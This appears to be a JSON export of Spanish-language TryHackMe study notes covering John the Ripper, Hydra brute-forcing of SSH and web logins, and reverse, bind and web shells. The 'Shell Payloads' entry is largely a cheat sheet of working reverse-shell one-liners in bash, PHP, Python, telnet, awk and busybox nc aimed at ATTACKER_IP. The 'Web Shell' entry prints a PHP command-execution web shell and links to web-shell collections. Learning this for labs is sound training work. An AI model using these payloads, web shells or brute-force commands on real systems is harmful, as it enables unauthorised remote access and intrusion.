    "content": "A lo largo de esta unidad estaremos usando:\n\n- La versi√≥n de John the Ripper: Jumbo John.\n- El diccionario `rockyou.txt`.\n\n-------------\n<h2>Instalaci√≥n</h2>\nJohn the Ripper est√° soportado en varios sistemas operativos, no s√≥lo distros Linux. La versi√≥n m√°s popular es Jumbo John.\n\n<h4>AttackBox y Kali Linux</h4>\nYa viene instalado. Puedes comprobarlo escribiendo `john` en la terminal.\n\n<h4>Otras distribuciones de Linux</h4>\nEn Fedora puedes instalarlo escribiendo `sudo dnf install john` y en Ubuntu `sudo apt install john`.\n\n----------------\n<h4>Instalarlo en Windows</h4>\nPara instalarlo en Windows necesitaremos descargar e instalar el binario comprimido para un sistema de [64 bits](https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.zip) o de [32 bits](https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win32.zip).\n\n-------------\n<h2>Diccionarios</h2>\nAhora que tenemos `john` debemos considerar otro componente indispensable, los diccionarios. Hay muchos diccionarios muy buenos, una buena colecci√≥n la podemos encontrar en el repositorio [SecLists](https://github.com/danielmiessler/SecLists). Por lo general, en el directorio `/usr/share/wordlists` hay buenos diccionarios para diferentes prop√≥sitos.\n\n<h4>RockYou</h4>\nPara todas las tareas de esta unidad vamos a estar usando el diccionario `rockyou.txt` en la secci√≥n `/passwords/Leaked-Database`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Cracking Password-Protected RAR Archives",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/10-cracking-password-protected-rar-archives/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/10. Cracking Password-Protected RAR Archives.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Podemos usar un proceso similar para obtener la contrase√±a de archivos RAR.\n\n-----------------\n<h2>Rar2John</h2>\nPr√°cticamente id√©ntico a la herramienta `zip2john`, usaremos la herramienta `rar2john` para convertir los archivos RAR en formato de hash que John pueda entender. La sint√°xis b√°sica es:\n\n`rar2john [archivo rar] > [archivo de salida]`\n\n- `rar2john`: Herramienta para convertir el RAR.\n- `[archivo rar]`: Ruta al archivo RAR.\n- `>`: Redireccionador.\n- `[archivo de salida]`: Nombre del archivo que contendr√° el hash.\n\nPor ejemplo:\n\n`/opt/john/rar2john rarfile.rar > rar_hash.txt`\n\n---------------\n<h2>Crackeo</h2>\nPara obtener la contrase√±a del archivo usaremos el hash que hemos obtenido y un diccionario:\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Using Hydra",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/1-hydra/2-using-hydra/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/1. Hydra/2. Using Hydra.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 1. Hydra",
    "content": "<h2>Comandos Hydra</h2>\nLas opciones que le pasemos a Hydra depender√°n de qu√© servicio (protocolo) estemos intentando atacar. Por ejemplo, si queremos atacar el srvicio FTP con el nombre de usurio `user` y la lista de contrase√±as `passlist.txt`, usar√≠amos el siguiente comendo:\n\n`hydra -l user -P passlist.txt ftp://IP`\n\nAqu√≠ vemos algunos comandos tanto para SSH como para formulario web (POST).\n\n---------------------------\n<h2>SSH</h2>\n`hydra -l <username> -P <full path to pass> <IP> -t <number> ssh`\n\n| Opci√≥n | Descripci√≥n                              |\n| ------ | ---------------------------------------- |\n| `-l`   | Especifica el usuario para el loguin SSH |\n| `-P`   | Indica la lista de contrase√±as.          |\n| `-t`   | Configura el n√∫mero de hilos que usar    |\nPor ejemplo, `hydra -l root -P passwords.txt 10.10.141.231 -t 4 ssh` lanzar√° un ataque de fuerza bruta contra el puerto 22 de la IP `10.10.141.231` con 4 hilos al usuario `root` con la lista de contrase√±as `passwords.txt`.\n\n-------------------------\n<h2>POST Web Form</h2>\nPodemos usar Hydra para bruteforcear formularios web tambi√©n. Debemos saber qu√© tipo de petici√≥n se est√° haciendo (GET/POST).\n\n`sudo hydra <username> <wordlist> <IP> http-post-form \"<path>:<login_credentials>:<invalid_response>\"`\n\n| Opci√≥n                | Descripci√≥n                                                                                            |\n| --------------------- | ------------------------------------------------------------------------------------------------------ |\n| `-l`                  | El nombre de usuario para el login                                                                     |\n| `-P`                  | La lista de contrase√±as                                                                                |\n| `http-post-form`      | El tipo de formulario es POST                                                                          |\n| `<path>`              | La URL de login, por ejemplo `login.php`                                                               |\n| `<login_credentials>` | El nombre de usuario y contrase√±a usados para loguearse, por ejemplo `username=^USER^&password=^PASS^` |\n| `<invalid_response>`  | Parte de la respuesta cuando el login falla                                                            |\n| `-V`                  | Output verboseado para cada intento                                                                    |\nPor ejemplo:\n\n`hydra -l username -P wordlist 10.10.141.231 http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V`\n\n- La p√°gina de login es la direcci√≥n principal (`/`).\n- El nombre de usuario es `username`.\n- Dicho nombre de usuario reemplazar√° a ^USER^.\n- La lista de contrase√±as es `wordlist`.\n- Dichas contrase√±as sustituir√°n a ^PASS^.\n- Finalmente, `F=incorrect` es una string que aparecer√° si el login en el servidor falla.\n\n-----------------------\n<h2>Challenge</h2>\n1. Abrimos la p√°gina dada:\n   ![[150.png]]\n2. Comprobamos el m√©todo, en este caso POST:\n   ![[151.png]]\n3. Lanzamos hydra con los par√°metros correspondientes:\n   ![[152 1.png]]\n4. Obtenemos la contrase√±a:\n   ![[153.png]]\n5. Entramos y obtenemos la flag:\n   ![[154.png]]\n6. Usamos hydra para romper la contrase√±a ssh de molly:\n   ![[155.png]]\n7. Entramos por ssh y obtenemos la flag:\n   ![[156.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Hydra Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/1-hydra/1-hydra-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/1. Hydra/1. Hydra Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 1. Hydra",
    "content": "<h2>¬øQu√© es Hydra?</h2>\nHydra es una herramienta de crackeo de contrase√±as por fuerza bruta. Hydra puede correr una lista e ir probando contrase√±as de esa lista, mucho m√°s r√°pido que hacerlo a mano.\n\nSeg√∫n la documentaci√≥n en su [repositorio oficial](https://github.com/vanhauser-thc/thc-hydra), Hydra puede bruteforcear los siguientes protocolos: ‚ÄúAsterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.‚Äù\n\nEsto muestra la importancia de hacer una contrase√±a segura, ya que si nuestra contrase√±a se encuentra dentro de alg√∫n diccionario es susceptible de ser rota.\n\n---------------------\n<h2>Instalando Hydra</h2> \nPara instalar hydra (viene preinstalada en Kali Linux), puedes hacerlo ejecutando `apt install hydra` o `dnf install hydra`. Tambi√©n puedes descargarla desde su repositorio oficial, listado arriba.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Hydra",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/1-hydra/0-hydra/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/1. Hydra/0. Hydra.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 1. Hydra",
    "content": "[[1. Hydra Introduction]]\n[[2. Using Hydra]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Shells Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/0-shells-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/0. Shells Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "[[1. Room Introduction]]\n[[2. Shell Overview]]\n[[3. Reverse Shell]]\n[[4. Bind Shell]]\n[[5. Shell Listeners]]\n[[6. Shell Payloads]]\n[[7. Web Shell]]\n[[8. Practical Task]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Practical Task",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/8-practical-task/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/8. Practical Task.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Tenemos la siguiente informaci√≥n antes de empezar:\n\n- 10.10.111.78:8080 hosts the landing page\n- 10.10.111.78:8081 hosts the web application that is vulnerable to command injection.\n- 10.10.111.78:8082 hosts the web application that is vulnerable to an unrestricted file upload.\n\n----------------------\n1. Entramos a la p√°gina principal dada:\n   ![[Pasted image 20251017174947.png]]\n2. Reverse/Bind Shell nos lleva al puerto `8081`:\n   ![[Pasted image 20251017175056.png]]\n\t1. Abrimos un listener:\n\t   ![[Pasted image 20251017175323.png]]\n\t2. Metemos el oneliner de reverse shell en la p√°gina:\n\t   ![[Pasted image 20251017175351.png]]\n\t3. Obtenemos la conexi√≥n:\n\t   ![[Pasted image 20251017175431.png]]\n\t4. Encontramos la flag:\n\t   ![[Pasted image 20251017175637.png]]\n3. Web Shell nos lleva al puerto `8082`:\n   ![[Pasted image 20251017175722.png]]\n\t1. Creamos el archivo `shell.php`:\n\t   ![[Pasted image 20251017175838.png]]\n\t2. Lo subimos al servidor:\n\t   ![[Pasted image 20251017175912.png]]\n\t3. Miramos en el directorio /uploads:\n\t   ![[Pasted image 20251017180444.png]]\n\t4. Buscamos el archivo flag en el directorio correspondiente:\n\t   ![[Pasted image 20251017180526.png]]\n\t5. Leemos la flag:\n\t   ![[Pasted image 20251017180612.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Shell Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/2-shell-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/2. Shell Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "<h2>¬øQu√© es una shell?</h2>\nUna shell es un software que permite al usuario interactuar con el sistema operativo. Puede ser una interfaz gr√°fica, pero normalmente es una interfaz de l√≠nea de comandos.\n\nEn ciberseguridad, se suele referir a una sesi√≥n shell espec√≠fica que un atacante usa al acceder a un sistema comprometido, permiti√©ndole ejecutar comandos y software. Algunas de las cosas que un atacante puede hacer con una shell son:\n\n- **Control Remoto del Sistema:** Permite al atacante ejecutar comandos o software remotamente.\n- **Escalada de Privilegios:** Si el acceso inicial a trav√©s de una shell est√° limitado o restringido, los atacantes pueden explorar maneas de escalar privilegios.\n- **Exfiltraci√≥n de Datos:** Una vez que los atacantes pueden ejecutar comandos, pueden explorar el sistema.\n- **Persistencia:** Una vez obtenido el acceso, los atacantes pueden dejar \"puertas abiertas\" en el sistema para volver a entrar m√°s adelante de una manera m√°s sencilla.\n- **Actividades de Post-Explotaci√≥n:** Despu√©s de ganar acceso, los atacantes pueden realizar una amplia selecci√≥n de actividades post-explotaci√≥n, como desplegar malware, crear cuentas escondidas, borrar informaci√≥n, etc.\n- **Acceder a otros Sistemas en la Red:** Dependiendo de las intenciones del atacante, la shell de acceso puede ser s√≥lo el inicio, si planea saltar a otros dispositivos de la red. Tambi√©n se conoce como pivotar.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Shell Payloads",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/6-shell-payloads/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/6. Shell Payloads.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Un payload de shell puede ser un comando o script que expone una shell a una conexi√≥n entrante en caso de una bind shell o que manda una conexi√≥n en caso de una reverse shell.\n\nExploremos algunos de los payloads que pueden ser usados en Linux OS para exponer shells mediante **reverse shell**.\n\n--------------------------\n<h2>Bash</h2>\n<h6>Normal Bash Reverse Shell</h6>\n```shell\nattacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT\n2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443\n```\n\nEsta reverse shell inicia una shell bash interactiva que redirige el input y output a trav√©s de una conexi√≥n TCP a la m√°quina del atacante en el puerto `443`. El operador `>&` combina ambos, est√°ndar output y error.\n\n<h6>Bash Read Line Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done \n```\n\nEsta reverse shell crea un nuevo descriptor de archivo (`5` en este caso) y se conecta a un socket TCP. Leer√° y ejecutar√° comandos desde el socket, mandando el output a trav√©s del mismo socket.\n\n<h6>Bash With File Descriptor 196 Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 \n```\n\nEsta reverse shell usa un descriptor de archivo (`196` en este caso) para establecer una conexi√≥n TCP. Permite al shell leer comandos de la red y mandar el output de vuelta mediante la misma conexi√≥n.\n\n<h6>Bash With File Descriptor 5 Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5\n```\n\nDe forma similar al primer ejemplo, este comando abre una shell, pero usa el descriptor `5` para el input y el output, permitiendo una sesi√≥n interactiva mediante una conexi√≥n TCP.\n\n----------------------\n<h2>PHP</h2>\n<h6>PHP Reverse Shell Using the exec Fuction</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);exec(\"sh <&3 >&3 2>&3\");' \n```\n\nEsta reverse shell crea una comunicaci√≥n socket a la IP del atacante en el puerto `443` y usa la funci√≥n `exec` para ejecutar una shell, redirigiendo el input y output est√°ndar.\n\n<h6>PHP Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);shell_exec(\"sh <&3 >&3 2>&3\");'\n```\n\nSimilar al comando anterior, pero usa la funci√≥n `shell_exec`.\n\n<h6>PHP Reverse Shell Using the system Function</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);system(\"sh <&3 >&3 2>&3\");' \n```\n\nEsta reverse shell usa la funci√≥n `system` la cual ejecuta el comando y muestra la salida en el navegador.\n\n<h6>PHP Reverse Shell Using the passthru Function</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);passthru(\"sh <&3 >&3 2>&3\");'\n```\n\nLa funci√≥n `passthru` ejecuta un comando y manda output raw de vuelta al navegador. Esto es √∫til al trabajar con datos binarios\n\n<h6>PHP Reverse Shell Using the popen Function</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);popen(\"sh <&3 >&3 2>&3\", \"r\");' \n```\n\nEsta reverse shell usa `popen` para abrir un puntero de proceso de archivo, permitiendo a la shell ser ejecutada.\n\n-------------------------\n<h2>Python</h2>\n<h6>Python Reverse Shell by Exporting Environment Variables</h6>\n```shell\ntarget@tryhackme:~$ export RHOST=\"ATTACKER_IP\"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' \n```\n\nConfigura el host remoto y puerto como variables de entorno, crea una conexi√≥n socket y duplica el descriptor de archivo del socket.\n<h6>Python Reverse Shell Using the subprocess Module</h6>\n```shell\ntarget@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.4.99.209\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")' \n```\n\nUsa el m√≥dulo `subprocess`para spawnear una shell y configurar un entorno similar al Python Reverse Shell exportando el comando de variables de entorno.\n<h6>Short Python Reverse Shell</h6>\n```shell\npython -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'\n```\n\nCrea un socket (`s`), se conecta al atacante, redirige el input,output y error est√°ndar al socket usando `os.dup2()`.\n\n--------------------------\n<h2>Otras</h2>\n<h6>Telnet</h6>\n```shell\ntarget@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF\n```\n\nCrea una named pipe usando `mkfifo` y se conecta al atacante v√≠a Telnet en la IP y puertos especificados.\n\n<h6>AWK</h6>\n```shell\ntarget@tryhackme:~$ awk 'BEGIN {s = \"/inet/tcp/0/ATTACKER_IP/443\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n```\n\nUsa el TCP en AWK para conectarse a la IP y puerto del atacante. Lee comandos del atacante y los ejecuta. Despu√©s manda los resultados de vuelta por la misma conexi√≥n TCP.\n\n<h6>BusyBox</h6>\n```shell\ntarget@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh\n```\n\nUsa Netcat (`nc`) para conectarse al atacante. Una vez establecida la conexi√≥n, ejecuta `/bin/sh`, exponiendo la l√≠nea de comandos al atacante.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Web Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/7-web-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/7. Web Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Una web shell es un script escrito en un lenguaje soportado por un servidor web comprometido que ejecuta comandos a trav√©s del propio servidor. Suele ser un archivo que contiene c√≥digo que ejecuta comandos y controla archivos.\n\nPueden ser escritas en diferentes lenguajes soportados por servidores web, como PHP, ASP, JSP o CGI.\n\n---------------------\n<h2>Ejemplo de Web Shell PHP</h2>\nVeamos un ejemplo de una web shell en PHP para entender c√≥mo funciona este proceso:\n\n```php\n<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n```\n\nLa shell de arriba puede guardarse en un archivo con extensi√≥n php, como `shell.php`, y luego subida a un servidor por el atacante para explotar vulnerabilidades como Unrestricted File Upload, File Inclusion, Command Injection y otras.\n\nDespu√©s de desplegar la webshell en el servidor puede ser accedida a trav√©s de la URL. Seg√∫n el ejemplo de arriba, tendr√≠amos que realizar una petici√≥n GET con el par√°metro \"cmd\". Si la p√°gina fuera `http://victim.com/uploads/shell.php`:\n\n`http://victim.com/uploads/shell.php?cmd=whoami`\n\nEsto ejecutar√° el comando whoami en el servidor y devolver√° el resultado a trav√©s del navegador.\n\n---------------------\n<h2>Web Shells Existentes Disponibles Online</h2>\nEl poder de los lenguajes soportados por los servidores web puede resultar en web shells con varias funcionalidades y evitar la detecci√≥n a la vez. Veamos algunas de las m√°s populares:\n\n- [p0wny-shell](https://github.com/flozz/p0wny-shell): Una web shell de un solo archivo PHP minimalista que permite RCE.\n  ![[Pasted image 20251017174237.png]]\n- [b374k shell](https://github.com/b374k/b374k): Una web shell PHP m√°s rica en funcionalidades con manejo de archivos y ejecuci√≥n de comandos, entre otras funcionalidades.\n  ![[Pasted image 20251017174417.png]]\n- [c99 shell](https://www.r57shell.net/single.php?id=13): Una web shell robusta y bien conocida con funcionalidades extensas.\n  ![[Pasted image 20251017174504.png]]\n\nSi quieres encontrar m√°s web shells: https://www.r57shell.net/index.php",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Reverse Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/3-reverse-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/3. Reverse Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Una reverse shell es una de las t√©cnicas m√°s populares para ganar acceso a un sistema en ciberataques. Las conexiones inician desde el sistema objetivo, lo que ayuda a reducir la detecci√≥n de firewalls y otras medidas de seguridad.\n\n-------------------\n<h2>¬øC√≥mo funcionan las reverse shells?</h2>\n\n------------------------\n<h4>Configura un Listener Netcat (nc)</h2>\nEntendamos ahora c√≥mo funcionan las reverse shells en un escenario pr√°ctico usando Netcat. Esta herramienta soporta varios sistemas operativos y permite leer y escribir a trav√©s de una red.\n\nComo ya hemos dicho, la conexi√≥n la comienza la m√°quina v√≠ctima, por lo que la m√°quina atacante estar√° esperando una conexi√≥n. Usaremos Netcat para escuchar. Usaremos el comando `nc -lvnp 443`.\n\n```shell\nattacker@kali:~$ nc -lvnp 443\nlistening on [any] 443 ...\n```\n\nEl comando usa las opciones:\n\n- `-l`: Indica a Netcat que escuche (listen) o espere por una conexi√≥n.\n- `-v`: Activa verbose para ver m√°s informaci√≥n.\n- `-n`: Previene que las conexiones usen DNS lookup por lo que lo har√° a partir de la IP.\n- `-p`: Indica el puerto que utilizaremos, en nuestro caso el 443.\n\nPuedes usar cualquier puerto para establecer la conexi√≥n pero los hackers suelen usar puertos conocidos utilizados por otras aplicaciones para enmascarar las conexiones.\n\n-------------------------\n<h4>Obteniendo una Reverse Shell</h4>\nUna vez que tenemos nuestro listener configurado, el objetivo debe ejecutar lo que se conoce como payload de reverse shell. Normalmente este payload abusa una vulnerabilidad o un acceso no autorizado. Hay mucha variedad de payloads, que depender√°n de las herramientas y el sistema operativo que sea atacado. Podemos ver algunos ejemplos [aqu√≠](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).\n\nAnalicemos un payload de ejemplo:\n\n`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP_ATACANTE> <PUERTO_ATACANTE> >/tmp/f`\n\n- `rm -f /tmp/f`: Elimina cualquier archivo pipe existente en `/tmp/f`. Esto es para crear una nueva pipe ah√≠ sin conflictos.\n- `mkfifo /tmp/f`: Crea una pipe o FIFO (First In First Out) en `/tmp/f`.\n- `cat /tmp/f`: Lee la informaci√≥n de la pipe (espera input).\n- `| bash -i 2>&1`: El output de cat se pipea a la instancia de shell (`bash -i`), que permite al atacante ejecutar comandos de manera interactiva. El `2>&1` redirecciona los errores al output (stderr a stdout), asegur√°ndose de que cualquier error se manda de vuelta al atacante.\n- `| nc IP_ATACANTE PUERTO ATACANTE`: Pipea el output de la shell hacia el atacante por medio de `nc` con la IP y el puerto.\n- `>/tmp/f`: Esta parte manda el output de los comandos de vuelta hacia el pipe, permitiendo comunicaci√≥n bidireccional.\n\n>[!IMPORTANT] Esto es una \"named pipe\", no una pipe normal. Una normal no permite comunicaci√≥n bidireccional con la misma.\n\n----------------------------\n<h4>El Atacante Recibe la Shell</h4>\nUna vez que el payload es ejecutado, el atacante ver√° una reverse shell en su Netcat, permiti√©ndole ejecutar comandos en el sistema remoto.\n\n```shell\nattacker@kali:~$ nc -lvnp 443\nlistening on [any] 443 ...\nconnect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964\nTo run a command as administrator (user \"root\"), use \"sudo \".\nSee \"man sudo_root\" for details.\n\ntarget@tryhackme:~$\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Room Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/1-room-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/1. Room Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Las shells en ciberseguridad son ampliamente usadas por los atacantes para ganar acceso remoto a sistemas, haci√©ndolas una parte importante de la cadena de ataque. En esta unidad, veremos diferentes shells usadas en la seguridad ofensiva, las diferencias entre ellas y sus casos de uso.\n\n--------------------------\n<h2>Objetivos de Aprendizaje</h2>\nEn esta unidad trataremos de:\n\n- Entender las Shells en la seguridad ofensiva.\n- Configurar y usar reverse y bind shells.\n- Desplegar shells web.\n\n----------------\n<h2>Pre-requisitos</h2>\nEs recomendable entendimiento en:\n\n- Networking basics.\n- Conocimiento fundamental en seguridad de aplicaciones web.\n- Eficiencia con la linea de comandos.\n- Familiaridad con lenguajes de scripting como Bash, Python o PHP.\n\n-------------------------\n<h2>Caveats</h2>\nEl uso de herramientas co frameworks como Metasploit se ha dejado atr√°s para esta unidad. Esto es para enfocarse m√°s en c√≥mo funcionan las shells sin ayuda de herramientas de asistencia.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Shell Listeners",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/5-shell-listeners/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/5. Shell Listeners.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Hasta ahora hemos estado usando Netcat para escuchar todas nuestras conexiones, pero hay m√°s. Exploremos algunas de las herramientas de escucha de conexiones.\n\n-----------------------\n<h2>Rlwrap</h2>\nEs una peque√±a utilidad que usa la librer√≠a readline de GNU para ofrecernos modificar el teclado e historial. A continuaci√≥n una muestra de un netcat mejorado con rlwrap:\n\n```shell\nattacker@kali:~$ rlwrap nc -lvnp 443\nlistening on [any] 443 ...\n```\n\nEnvuelve `nc` con `rlwrap`, permitiendo el uso de funcionalidades como el uso de flechas e historial para una mejor interacci√≥n.\n\n-------------------\n<h2>Ncat</h2>\nNcat es una versi√≥n mejorada de Netcat distribuida por el proyecto NMAP. Ofrece funcionalidades extra, como encriptaci√≥n SSL. A continuaci√≥n unos ejemplos escuchando reverse shells sin y con encriptaci√≥n SSL, respectivamente:\n\n```shell\nattacker@kali:~$ ncat -lvnp 4444\nNcat: Version 7.94SVN ( https://nmap.org/ncat )\nNcat: Listening on [::]:443\nNcat: Listening on 0.0.0.0:443\n```\n\n```shell\nattacker@kali:~$ ncat --ssl -lvnp 4444\nNcat: Version 7.94SVN ( https://nmap.org/ncat )\nNcat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\nNcat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F\nNcat: Listening on [::]:443\nNcat: Listening on 0.0.0.0:443\n```\n\nLa opci√≥n `--ssl` habilita la encriptaci√≥n SSL para el listener.\n\n--------------------------\n<h2>Socat</h2>\nEs una utilidad que permite crear una conexi√≥n socket entre dos fuentes de informaci√≥n, en este caso, dos hosts diferentes.\n\n```shell\nattacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT\n2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443\n```\n\nEl comando de arriba usa la opci√≥n `-d` para permitir el output verbose, usarlo m√°s veces incrementa el verbose (`-d -d`). La opci√≥n `TCP-LISTEN:443` crea un listener TCP en el puerto 443. Finalmente la opci√≥n STDOUT dirije cualquier informaci√≥n entrante a la terminal.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Bind Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/4-bind-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/4. Bind Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
